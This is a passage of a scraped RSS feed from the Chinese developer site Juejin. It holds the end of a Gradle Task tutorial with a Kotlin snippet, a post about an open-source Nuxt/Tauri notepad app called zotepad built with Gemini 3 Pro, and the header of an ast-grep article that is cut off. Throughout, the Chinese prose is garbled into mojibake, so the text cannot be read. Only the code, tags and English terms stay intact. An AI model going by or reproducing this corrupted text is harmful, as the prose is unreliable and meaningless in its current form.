<p>å…³äºè¾“å…¥å’Œè¾“å‡ºï¼Œä¸Šè¾¹çš„è‡ªå®šä¹‰Taskæ³¨è§£ä»£è¡¨çš„å«ä¹‰ç®€å•åˆ—ä¸¾ä¸‹å¸¸ç”¨çš„ï¼š
<strong>å¸¸ç”¨çš„æ³¨è§£</strong></p>


















































<table><thead><tr><th>æ³¨è§£</th><th>ä½œç”¨</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>@Input</code></td><td>æ ‡è®°è¾“å…¥å±æ€§</td><td>å­—ç¬¦ä¸²ã€æ•°å­—ç­‰</td></tr><tr><td><code>@InputFile</code></td><td>æ ‡è®°è¾“å…¥æ–‡ä»¶</td><td>å•ä¸ªæ–‡ä»¶</td></tr><tr><td><code>@InputFiles</code></td><td>æ ‡è®°è¾“å…¥æ–‡ä»¶é›†åˆ</td><td>å¤šä¸ªæ–‡ä»¶</td></tr><tr><td><code>@InputDirectory</code></td><td>æ ‡è®°è¾“å…¥ç›®å½•</td><td>ç›®å½•</td></tr><tr><td><code>@OutputFile</code></td><td>æ ‡è®°è¾“å‡ºæ–‡ä»¶</td><td>å•ä¸ªæ–‡ä»¶</td></tr><tr><td><code>@OutputFiles</code></td><td>æ ‡è®°è¾“å‡ºæ–‡ä»¶é›†åˆ</td><td>å¤šä¸ªæ–‡ä»¶</td></tr><tr><td><code>@OutputDirectory</code></td><td>æ ‡è®°è¾“å‡ºç›®å½•</td><td>ç›®å½•</td></tr><tr><td><code>@Internal</code></td><td>æ ‡è®°å†…éƒ¨å±æ€§ï¼ˆä¸å‚ä¸å¢é‡æ„å»ºï¼‰</td><td>ä¸´æ—¶å˜é‡</td></tr></tbody></table>
<h3 data-id="heading-15">ç¦ç”¨å¢é‡æ„å»º</h3>
<pre><code class="hljs language-kotlin" lang="kotlin">tasks.register(<span class="hljs-string">"alwaysRun"</span>) {
    <span class="hljs-comment">// ç¦ç”¨UP-TO-DATEæ£€æŸ¥</span>
    outputs.upToDateWhen { <span class="hljs-literal">false</span> }
    
    doLast {
        println(<span class="hljs-string">"æ¯æ¬¡éƒ½æ‰§è¡Œ"</span>)
    }
}
</code></pre>
<h2 data-id="heading-16">æœ€å</h2>
<p>â€ƒâ€ƒä¸»è¦å­¦ä¹ äº† Task åŸºç¡€çŸ¥è¯†å§ï¼Œéƒ½æ˜¯ä¸ºäº†æœ€åçš„è‡ªå®šä¹‰æ’ä»¶å·¥ä½œçš„ï¼ŒåŸºç¡€ä½†æ˜¯æ˜¯å¿…è¦çš„ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€Œzotepadã€ç”¨Gemini3proå†™å‡ºä¸€ä¸ªé«˜æ•ˆå†™ä½œå’Œå‘æ–‡çš„è®°äº‹æœ¬åº”ç”¨]]></title>    <link>https://juejin.cn/post/7581041679189606435</link>    <guid>https://juejin.cn/post/7581041679189606435</guid>    <pubDate>2025-12-08T06:43:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581041679189606435" data-draft-id="7581036773607899136" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€Œzotepadã€ç”¨Gemini3proå†™å‡ºä¸€ä¸ªé«˜æ•ˆå†™ä½œå’Œå‘æ–‡çš„è®°äº‹æœ¬åº”ç”¨"/> <meta itemprop="keywords" content="å‰ç«¯,Nuxt.js,Android"/> <meta itemprop="datePublished" content="2025-12-08T06:43:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿åº·zz"/> <meta itemprop="url" content="https://juejin.cn/user/1978776659428727"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€Œzotepadã€ç”¨Gemini3proå†™å‡ºä¸€ä¸ªé«˜æ•ˆå†™ä½œå’Œå‘æ–‡çš„è®°äº‹æœ¬åº”ç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1978776659428727/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é˜¿åº·zz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T06:43:13.000Z" title="Mon Dec 08 2025 06:43:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>èµ·å› æ˜¯æœ€è¿‘ä» <code>macos</code> åˆ‡æ¢åˆ°äº† <code>windows11</code>ï¼Œè½¯ä»¶ç”Ÿæ€å…¨éƒ¨æ¢æ–°ã€‚</p>
<p>è€Œ <code>Gemini3pro</code> å‰ä¸¤å‘¨åˆšåˆšå‘å¸ƒï¼Œæˆ‘æ­£å¥½å®éªŒä¸€ä¸‹æ•ˆæœå¦‚ä½•ã€‚å°±æ²¡æœ‰ç€æ€¥å®‰è£… <code>Obsidian</code>ï¼Œç”¨ <code>Gemini3p</code> å†™äº†ä¸ª demo ã€Œ<code>zotepad</code>ã€è¯•è¯•ã€‚</p>
<p>ç¬¬ä¸€ç‰ˆçš„UIæ•ˆæœæ„Ÿè§‰ä¸é”™ï¼Œå¾ˆç®€æ´ã€‚</p>
<p><strong>ä¸€ä¸ªäº§å“èƒ½ç”¨èµ·æ¥é¦–å…ˆå¾—ä¸ä¸‘å§ã€‚</strong></p>
<p>äºæ˜¯å°±å†³å®šå®Œå–„ä¸€ä¸‹è‡ªå·±å¹³æ—¶å®é™…åœ¨ç”¨çš„æµç¨‹ï¼Œçœ‹çœ‹èƒ½åšåˆ°ä»€ä¹ˆåœ°æ­¥ã€‚</p>
<p>æ‰€ä»¥æ­¤Appå›´ç»•æˆ‘å¹³æ—¶å†™æ–‡ç« ã€å‘åŠ¨æ€ä»¥åŠå‘å¸ƒæ–‡ç« è¿™æ¡ä¸»çº¿å±•å¼€ã€‚</p>
<p>Appç›®å‰çš„å‡ ä¸ªä¸»é¡µ</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8988305e860c4435b2baf959f978c4ef~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5bq3eno=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780993&amp;x-signature=ZV9NuIQsOKkrCzBvRlfNVk1eryE%3D" alt="" loading="lazy"/></p>
<p>æ ¸å¿ƒåŠŸèƒ½ï¼šmdç¼–è¾‘å™¨ -&gt; å›¾åºŠï¼ˆä¸Šä¼ å›¾ç‰‡ï¼‰-&gt; æµ ï¼ˆhttpè¯·æ±‚ï¼‰</p>
<p>å†…ç½®æµï¼šç”Ÿæˆå…¬ä¼—å·ç¼–è¾‘å™¨å¯ç”¨çš„æ ·å¼ -&gt; å‘é€åˆ°å…¬ä¼—å·è‰ç¨¿ç®±/æ‰‹åŠ¨å¤åˆ¶æ ·å¼</p>
<p><strong><code>æµ</code>å°±æ˜¯ä¸€ç»„è‡ªå®šä¹‰çš„httpè¯·æ±‚</strong>ï¼Œappå†…çš„å†…å®¹ä¼šä½œä¸ºåˆå§‹å‚æ•°ä¼ é€’ç»™<code>æµ</code>çš„ç¬¬ä¸€ä¸ªhttpè¯·æ±‚ï¼Œåç»­æ¯ä¸ªhttpè¯·æ±‚è¿”å›çš„æ•°æ®ä¼šæ”¾åœ¨åŒä¸€ä¸ª<code>ctx</code>(ä¸Šä¸‹æ–‡ä¸­)ï¼Œç†è®ºä¸Šå¯ä»¥å®ç°ä»»æ„åŠŸèƒ½ã€‚</p>
<p>æ¯”å¦‚ã€Œ<strong>å‘é€å…¬ä¼—å·è‰ç¨¿ç®±</strong>ã€è¿™ä¸ªå†…ç½®æµåŒ…æ‹¬ä¸‰ä¸ªhttpè¯·æ±‚ï¼š</p>
<ol>
<li>è·å–å¾®ä¿¡æˆæƒaccess_token</li>
<li>ä¸Šä¼ å›¾ç‰‡åˆ°æ°¸ä¹…ç´ æ</li>
<li>å‘é€åˆ°è‰ç¨¿ç®±</li>
</ol>
<p><strong>å¹¶ä¸”æµå¯ä»¥å¯¼å‡ºä¸ºjsonæ ¼å¼ï¼Œä»¥åŠå¯ä»¥å¯¼å…¥åˆ«äººçš„æµ</strong></p>
<p>ç¼–è¾‘åŠå‘é€åŠŸèƒ½æ¼”ç¤ºâ¬‡ï¸</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4cde23451b004d54b16ed3792b712bdd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_5bq3eno=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765780993&amp;x-signature=Z2VNl1%2BeGXvu%2F6InwgYmmvHkTmI%3D" alt="" loading="lazy"/></p>
<p>å›¾ç‰‡æ–¹é¢ï¼Œæˆ‘ç›®å‰ç”¨çš„è…¾è®¯äº‘æ‰€ä»¥ç›´æ¥å…ˆå®ç°äº†è…¾è®¯äº‘ã€‚</p>
<p>å…¬ä¼—å·æ ·å¼ï¼Œä¹‹å‰åœ¨æˆ‘è‡ªç ”çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fzzao.club" target="_blank" title="https://zzao.club" ref="nofollow noopener noreferrer">å…¨æ ˆåšå®¢ç«™</a>ä¸Šå·²ç»æœ‰äº†ä¸€å¥—æ–¹æ³•å¯ç”¨ã€‚è¿™æ¬¡å¤åˆ»åˆ°äº†<code>zotepad</code>ä¸Šï¼Œä¸»è¦æ˜¯è¸©äº†ä¸€ä¸‹å…¬ä¼—å·åŠ©æ‰‹ App ç²˜è´´ html åæ ·å¼é”™ä¹±çš„å‘ã€‚å…‰è¿™ä¸€ä¸ªå¤åˆ¶æ ·å¼åŠŸèƒ½ï¼Œå·²ç»æœ‰ä¸å°‘ç½‘ç«™åœˆèµ·æ¥æ”¶è´¹äº†...</p>
<p>å‘é€è‰ç¨¿ç®±ï¼Œè¯»äº†è¯»å…¬ä¼—å·çš„å¼€å‘æ–‡æ¡£ï¼Œå‘ç°åªè¦è¿™ä¸‰ä¸ªæ¥å£å°±å¯ä»¥ã€‚</p>
<p>å…³äº<code>æµ</code>é‡Œçš„Httpè¯·æ±‚ä¸­çš„æ•æ„Ÿæ•°æ®ï¼Œè®¾ç½®é‡Œå¯ä»¥é…ç½®ç±»ä¼¼<code>Github Secrets</code>çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨æµé‡Œç”¨æ¨¡æ¿å­—ç¬¦ä¸²çš„å†™æ³•ä»£æ›¿çœŸå®çš„æ•æ„Ÿä¿¡æ¯ <code>{{token}}</code>ã€‚<strong>è¿™æ ·å¯ä»¥é¿å…å¤åˆ¶å‡ºæ¥çš„JSONé‡Œæºå¸¦è‡ªå·±çš„ä¿å¯†ä¿¡æ¯ã€‚</strong></p>
<p>ä½†æ˜¯è¿™ä¸€ç‚¹å°±å’Œæ”¾åœ¨webç«¯çš„æ•æ„Ÿä¿¡æ¯ä¸€æ ·ï¼Œ<strong>å›å­ä¸ç”¨é˜²ï¼Œå°äººé˜²ä¸ä½</strong>ã€‚</p>
<p>åç»­å›´ç»•ä¸»çº¿åŠŸèƒ½ä¼šäº§ç”Ÿå¦‚ä¸‹<strong>æ”¯çº¿åŠŸèƒ½</strong>ï¼š</p>
<ol>
<li>å›¾åºŠã€‚å†™æ–‡ç« å¿…é¡»è¦æœ‰ï¼Œå·²å®ç°è…¾è®¯äº‘ã€‚</li>
<li>å›¾ç‰‡å‹ç¼©ã€æ ¼å¼è½¬æ¢ã€‚æœ¬æ¥æ˜¯ä¸å¿…é¡»ï¼Œä½†<strong>æ­¤appçš„ä¸»è¦æ„¿æ™¯æ˜¯è®©æˆ‘å¤šå†™ç‚¹ä¸œè¥¿</strong>ï¼Œå¤šå†™å°±è¦å¤šä¼ å›¾ï¼Œæµé‡å°±æ˜¯é’±ï¼Œæ‰€ä»¥è¿™ä¹Ÿæ˜¯å¿…é¡»è¦åšçš„äº†</li>
<li>å›¾ç‰‡æ‹¼å›¾ã€åˆ†å‰²ã€‚åƒæ˜¯ç»™è¿™ä¸ªappå†™ç‚¹å®£ä¼ æ–‡ç« ï¼Œè¿˜æ˜¯æŠŠå›¾ç‰‡æ‹¼èµ·æ¥åˆ«äººçœ‹ç€æ–¹ä¾¿ä¸€äº›ã€‚</li>
<li>å›¾ç‰‡ç¾åŒ–ã€æ–‡å­—è½¬å›¾ç‰‡ã€‚ç±»ä¼¼å¾®ä¿¡çš„æ’ç‰ˆæˆå›¾ä»¥åŠå°çº¢ä¹¦çš„æ–‡å­—ç”Ÿæˆå›¾ç‰‡ï¼Œå®¢æˆ·ç«¯çš„ä¼˜åŠ¿ä¹Ÿè®¸ä¸»è¦åœ¨äºå¯ä»¥æ‰¹é‡ã€‚</li>
<li>æ›´å¤šçš„<code>æµ</code>ã€‚æ¯”å¦‚è·å–V2EXçš„ä¿¡æ¯ï¼Œåªè¦åœ¨è®¾ç½®é‡Œé…å¥½è‡ªå·±çš„<code>V2EX_PAT</code>ï¼Œé‚£æµæœ¬èº«å°±å¯ä»¥å¤åˆ¶åˆ«äººçš„äº†ã€‚</li>
<li>æ–‡ç« è´Ÿè´£å‘å…¬ä¼—å·å›¾æ–‡æ¨¡å¼ï¼ŒåŠ¨æ€å°±å¯¹åº”"å°ç»¿ä¹¦"æ¨¡å¼ï¼Œè¿™ä¸ªæ¯”è¾ƒç®€å•</li>
<li>æ–‡ç« æ ·å¼è‡ªå®šä¹‰ã€‚è¿™ä¸€ç‚¹ç¼–è¾‘å™¨æœ¬èº«å…¶å®å·²ç»å†…ç½®äº†å…­ä¸ƒä¸ªä¸»é¢˜ï¼Œæˆ‘æš‚æ—¶æ²¡æœ‰æ”¾å¼€ã€‚å‡†å¤‡å†åŠ ä¸€ä¸ªè‡ªå®šä¹‰æ ·å¼ï¼Œå®ç°ä¸€äº›å¤æ‚æ ·å¼ã€‚</li>
<li>å‰ªè´´æ¿ã€‚åŒæ ·ä½œä¸ºä¸€ä¸ªå†…å®¹æ¥æºï¼Œæˆ‘æ­£åœ¨è€ƒè™‘è¿™ä¸ªåŠŸèƒ½çš„å¿…è¦æ€§ã€‚</li>
<li>å¯¼å‡ºæ•°æ®ã€å¯¼å…¥æ•°æ®ã€‚å¿…åšçš„ã€‚</li>
<li>åŒæ­¥åŠŸèƒ½ã€‚</li>
</ol>
<p>åŒæ­¥åŠŸèƒ½å·²ç»æœ‰äº†ä¸€äº›æ€è€ƒï¼Œæ²¡æœ‰åƒç”¨ç±»ä¼¼ <strong>Git</strong>ã€<strong>webDav</strong> ç­‰åŒæ­¥æ–¹å¼ï¼Œæˆ‘æŠŠå®¢æˆ·ç«¯å’Œç§»åŠ¨ç«¯<strong>ç±»æ¯”ä¸ºæ‰‹æœºå’Œæ™ºèƒ½æ‰‹è¡¨</strong>çš„å…³ç³»ã€‚</p>
<p>å®¢æˆ·ç«¯å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨å¯åŠ¨ä¸€ä¸ªæœ¬åœ°æœåŠ¡å™¨ï¼Œè¿™ä¸€ç‚¹ç¡®ä¿äº†<strong>ä¸¤è€…å¯ä»¥é€šè¿‡åŒä¸€ä¸ªå±€åŸŸç½‘é€šä¿¡</strong>ã€‚å› ä¸ºæ‰‹æœºä¸ä¼šç¦»èº«ï¼Œè€Œç”µè„‘åœ¨å·¥ä½œæ‘¸é±¼æœŸé—´åˆ™æ˜¯ç»å¯¹çš„ä¸»åŠ›ã€‚</p>
<p>è¿™æ ·åœ¨å·¥ä½œæœŸé—´ï¼Œç†è®ºä¸Šç”µè„‘ç«¯çš„å†…å®¹æ˜¯æœ€æ–°çš„ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ç§»åŠ¨ç«¯ä½¿ç”¨ä¸€ä¸ªå«ã€Œæ‹‰å–ç”µè„‘ç«¯æ•°æ®ã€çš„æµï¼ŒæŠŠå®¢æˆ·ç«¯çš„æ•°æ®ç›´æ¥ç”¨httpè¯·æ±‚è·å–è¿‡å»ï¼Œå­˜åœ¨æ‰‹æœºä¸Šã€‚</p>
<p><strong>å…³ä¸Šç”µè„‘å›å®¶ä¹‹åï¼ŒåŸºæœ¬ç”µè„‘ä¸Šä¸ä¼šè¢«æ‰“å¼€</strong>ã€‚æ­¤æ—¶ç”¨æ‰‹æœºç å­—æ‰‹æœºå‘æ–‡ç« ï¼Œç­‰ç¬¬äºŒå¤©ä¸Šç­ä¹‹åï¼Œæ‰“å¼€ç”µè„‘ç«¯ï¼Œå°±å¯ä»¥å†ç”¨å¦ä¸€ä¸ªæµã€Œå‘ç”µè„‘ç«¯ä¼ é€æ•°æ®ã€å‘ç”µè„‘ç«¯å‘æ•°æ®ã€‚</p>
<p>å¯¹äºä¸¤å°ç”µè„‘ï¼Œä¸‰ä¸ªæ‰‹æœºç­‰ç±»ä¼¼é—®é¢˜ï¼Œæ— éå°±æ˜¯æµå†…æ¥å£å¤„ç†æ—¶å¢åŠ ä¸åŒæœºå™¨çš„æ ‡è¯†é—®é¢˜ï¼Œä¼¼ä¹éš¾åº¦ä¸å¤§ï¼Œä¹Ÿä¸éœ€è¦å¤„ç†å†²çªé—®é¢˜ã€‚<strong>ä¹Ÿè€ƒè™‘åˆ°å¯èƒ½ä¸€ä¸ªç”¨æˆ·ä¹Ÿæ²¡æœ‰æˆ–åªæœ‰æå°‘æ•°åŒé¢‘ç”¨æˆ·ï¼Œæ‰€ä»¥ä¹Ÿè®¸ä¸€ä¸ªæ‰‹æœºå¯¹å¤šä¸ªç”µè„‘å°±èƒ½æ»¡è¶³äº†ã€‚</strong></p>
<p>ä»¥ä¸Šå°±æ˜¯æœ€è¿‘1-2å‘¨åœ¨ç”¨<code>Gemini3pro</code>æ‰“ç£¨çš„<code>zotepad</code>ï¼ŒåŸºæœ¬å°±æ˜¯è‡ªå·±æ€ä¹ˆç”¨ï¼Œäº§å“å°±å¾€ä»€ä¹ˆæ–¹å‘èµ°ã€‚</p>
<p><strong>æ‰€ä»¥ä¹Ÿå¸Œæœ›æœ‰æ›´å¤šçš„æƒ³æ³•ç¢°æ’ä¸€ä¸‹ï¼Œå®ç°æ›´å¤šäººçš„éœ€æ±‚ã€‚</strong></p>
<p>åŒæ—¶åé¢ä¹Ÿä¼šåˆ†äº«ä¸€ä¸‹å¦‚ä½•å’Œ <code>Gemini</code> æ²Ÿé€šï¼Œè®©å®ƒå‡†ç¡®çš„å®Œæˆä»»åŠ¡ã€‚</p>
<p>é¡¹ç›®ç›®å‰å®Œå…¨å¼€æºå…è´¹ï¼Œ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faatrooox%2Fzotepad" target="_blank" title="https://github.com/aatrooox/zotepad" ref="nofollow noopener noreferrer">Githubåœ°å€</a>ï¼Œ<strong>æ¬¢è¿ Starã€Issue</strong></p>
<p>é¡¹ç›®æŠ€æœ¯æ ˆï¼šNuxt4 + Tauri2</p>
<p>æ”¯æŒ<strong>å®‰å“App</strong>ã€<strong>Windows</strong>ã€<strong>Macos</strong> ä¸‰ç«¯</p>
<p>æ•°æ®å­˜å‚¨ï¼šSqliteã€‚çº¯æœ¬åœ°</p>
<p>é¡¹ç›®ç®€ä»‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzzao.club%2Fproduct%2Fzotepad" target="_blank" title="https://zzao.club/product/zotepad" ref="nofollow noopener noreferrer">ZotePad</a></p>
<hr/>
<p><em>Powered by ZotePad</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è®© ast-grep å¬ä½ çš„ï¼šæŒ‡å®šè¯­è¨€è§£æ Vue/TSX/JSX å…¨æµç¨‹]]></title>    <link>https://juejin.cn/post/7581098720034373672</link>    <guid>https://juejin.cn/post/7581098720034373672</guid>    <pubDate>2025-12-08T07:03:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581098720034373672" data-draft-id="7581098720034340904" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è®© ast-grep å¬ä½ çš„ï¼šæŒ‡å®šè¯­è¨€è§£æ Vue/TSX/JSX å…¨æµç¨‹"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,JavaScript"/> <meta itemprop="datePublished" content="2025-12-08T07:03:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç«è½¦å¼ä½"/> <meta itemprop="url" content="https://juejin.cn/user/1345457960792808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è®© ast-grep å¬ä½ çš„ï¼šæŒ‡å®šè¯­è¨€è§£æ Vue/TSX/JSX å…¨æµç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1345457960792808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç«è½¦å¼ä½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T07:03:05.000Z" title="Mon Dec 08 2025 07:03:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
